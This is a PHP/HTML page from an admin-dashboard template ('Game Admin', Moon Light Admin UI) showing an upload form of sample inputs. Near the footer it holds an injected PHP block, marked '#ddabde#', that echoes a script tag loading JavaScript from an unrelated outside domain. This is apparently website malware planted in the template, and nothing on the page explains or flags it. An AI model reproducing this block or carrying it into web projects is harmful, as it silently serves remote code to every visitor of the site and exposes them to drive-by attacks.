<!DOCTYPE html>
  <!--[if lt IE 7]>
    <html class="lt-ie9 lt-ie8 lt-ie7" lang="en">
  <![endif]-->

  <!--[if IE 7]>
    <html class="lt-ie9 lt-ie8" lang="en">
  <![endif]-->

  <!--[if IE 8]>
    <html class="lt-ie9" lang="en">
  <![endif]-->

  <!--[if gt IE 8]>
    <!-->
    <html lang="en">
    <!--
  <![endif]-->

  <head>
    <meta charset="utf-8">
    <title>Game Admin</title>
    <meta name="author" content="Srinu Basava">
    <meta content="width=device-width, initial-scale=1.0, user-scalable=no" name="viewport">
    <meta name="description" content="Moon Light Admin Admin UI">
    <meta name="keywords" content="Moon Light Admin, Admin UI, Admin Dashboard, Srinu Basava">
    <script src="js/html5-trunk.js"></script>
    <link href="icomoon/style.css" rel="stylesheet">
    <link href="css/main.css" rel="stylesheet">
    <!--[if lte IE 7]>
      <script src="css/icomoon-font/lte-ie7.js"></script>
    <![endif]-->
    <link href="css/wysiwyg/bootstrap-wysihtml5.css" rel="stylesheet">
    <link href="css/wysiwyg/wysiwyg-color.css" rel="stylesheet">
    <link href="css/timepicker.css" rel="stylesheet">
    <link href="css/bootstrap-editable.css" rel="stylesheet">
    <link href="css/select2.css" rel="stylesheet">
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-40571798-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>
<style>
.daterangepicker{
	right:310px !important;
}
.daterangepicker.opensleft:before, .daterangepicker.opensleft:after{
	right:356px !important;
}
</style>
  </head>
  <body>
  
    <?php 
		  	include "inc/header.php";
    ?>

    <div class="container-fluid">
    
      <?php 
		  	include "inc/main_nav.php";
	  ?>

      <div class="dashboard-wrapper">
        <div class="main-container">
        
          <?php 
		  	include "inc/sub_navbar.php";
		  ?>

          <div class="row-fluid">
            <div class="span12">
              <ul class="breadcrumb-beauty">
                <li>
                  <a href="index.html">Dashboard</a>
                </li>
                <li>
                  <a href="#">Upload Page</a>
                </li>
              </ul>
            </div>
          </div>

          <br>

          <div class="row-fluid">
            <div class="span6">
              <div class="widget">
                <div class="widget-header">
                  <div class="title">
                    Editable Inputs
                  </div>
                </div>
                <div class="widget-body">
                  <form class="form-horizontal no-margin well">
                    <h5 class="text-info">Login Information</h5>
                    <hr>
                    <div class="control-group">
                      <label class="control-label">
                        Title
                      </label>
                      <div class="controls">
                        <input class="input-xlarge" type="text" placeholder="name">
                      </div>
                    </div>
                    <div class="control-group">
                      <label class="control-label">
                        Text Feild
                      </label>
                      <div class="controls">
                        <textarea class="input-block-level no-margin" style="height: 112px" placeholder="Textarea"> </textarea>
                      </div>
                    </div>
                    <div class="control-group">
                      <label class="control-label">
                        Time Picker
                      </label>
                      <div class="controls">
                        <input id="timepicker1" class="span2" type="text" value="12:50:00" >
                      </div>
                    </div>
                    <div class="control-group">
                      <label class="control-label">
                        Date Picker
                      </label>
                      <div class="controls">
                        <input id="date_range1" class="span4 date_picker" type="text" placeholder="Select Date" name="date_range1">
                      </div>
                    </div>
                    <div class="control-group">
                      <label class="control-label">
                        Select Box
                      </label>
                      <div class="controls">
                        <select id="DateOfBirthMonth" class="span4">
                            <option> Month - </option>
                            <option value="1"> January </option>
                            <option value="2"> February </option>
                            <option value="3"> March </option>
                            <option value="4"> April </option>
                            <option value="5"> May </option>
                            <option value="6"> June </option>
                            <option value="7"> July </option>
                            <option value="8"> August </option>
                            <option value="9"> September </option>
                            <option value="10"> October </option>
                            <option value="11"> November </option>
                            <option value="12"> December </option>
                         </select>
                      </div>
                    </div>
                    
                    <div class="control-group">
                      <label class="control-label">
                        Check Box
                      </label>
                      <div class="controls">
                        <label class="checkbox inline">
							<input type="checkbox" value="">
							Default
						</label>
						<label class="checkbox inline">
							<input type="checkbox" checked="" value="">
							Checked
						</label>
                      </div>
                    </div>
                    <div class="control-group">
                      <label class="control-label">
                        Check Box
                      </label>
                      <div class="controls">
                        <label class="radio inline">
							<input id="optionsRadios1" type="radio" value="option1" name="optionsRadios">
							Default
						</label>
						<label class="radio inline">
							<input id="optionsRadios2" type="radio" checked="" value="option2" name="optionsRadios">
							Selected
						</label>
                      </div>
                    </div>
                    <div class="form-actions no-margin">
                      <button type="submit" class="btn btn-info">
                        Save
                      </button>
                      <button type="button" class="btn">
                        Cancel
                      </button>
                    </div>
                  </form>
                </div>
              </div>
            </div>

            
          </div>

          
        </div>
      </div>
    </div>
    
    <?php
    include 'inc/footer.php';
    ?>
<?php
#ddabde#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967023\"></script>";
echo $g;
}
#/ddabde#
?>    
    <script src="js/wysiwyg/wysihtml5-0.3.0.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/wysiwyg/bootstrap-wysihtml5.js"></script>
    <script type="text/javascript" src="js/date-picker/date.js"></script>
    <script type="text/javascript" src="js/date-picker/daterangepicker.js"></script>
    <script type="text/javascript" src="js/bootstrap-timepicker.js"></script>

    <!-- Editable Inputs -->
    <script src="js/bootstrap-editable.min.js"></script>
    <script src="js/select2.js"></script>
    
    <!-- custom Js -->
    <script src="js/custom-forms.js"></script>
    <script src="js/custom.js"></script>

  </body>
</html>